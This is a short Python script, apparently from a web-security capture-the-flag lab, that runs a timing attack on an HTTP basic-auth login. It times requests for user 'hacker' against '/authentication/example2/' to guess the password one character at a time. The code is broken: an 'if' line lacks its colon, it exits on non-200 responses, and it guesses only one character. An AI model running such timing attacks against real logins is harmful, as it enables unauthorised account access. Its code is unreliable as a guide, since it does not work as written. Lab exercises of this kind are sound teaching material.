#! /User/kelseytroeger/webSecCTF/env/bin/python3

import requests
import time
import sys
import re
from bs4 import BeautifulSoup


"""Check that the user supplied an IP or web address. Syntax should be [python3 websecp2.py localhost:8000]"""
if len(sys.argv) != 2 :
  print("Too few arguments")
  sys.exit()

# Initialization
address = sys.argv[1]
pass_list = ['0','1','2','3','4','5','6','7','8','9','0','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
list_length = len(pass_list)
first= second = 0
password = letter1 = letter2 = ""

for x in range(list_length) :
  url = "http://"+address+"/authentication/example2/"
  r = requests.get(url, auth=('hacker', pass_list[x]))
  if r.status_code != 200
    print("Bad HTTP request")
    sys.exit()

  print("character : ", pass_list[x])
  print("response time seconds :", r.elapsed.total_seconds())
  y = r.elapsed.total_seconds()
  if y > first :
    letter1 = pass_list[x]
    second = first
    first = y
  elif (y > second and y != first) :
    letter2 = pass_list[x]
    second = y 


print(first, letter1)
print(second, letter2)

check1 = requests.get(url, auth=('hacker', password+letter1))
s = check1.elapsed.total_seconds()
check2 = requests.get(url, auth=('hacker', password+letter2))    
t = check2.elapsed.total_seconds()
password = password+letter1 if s > t else password+letter2
print("Current password : ", password)


print(r.text)
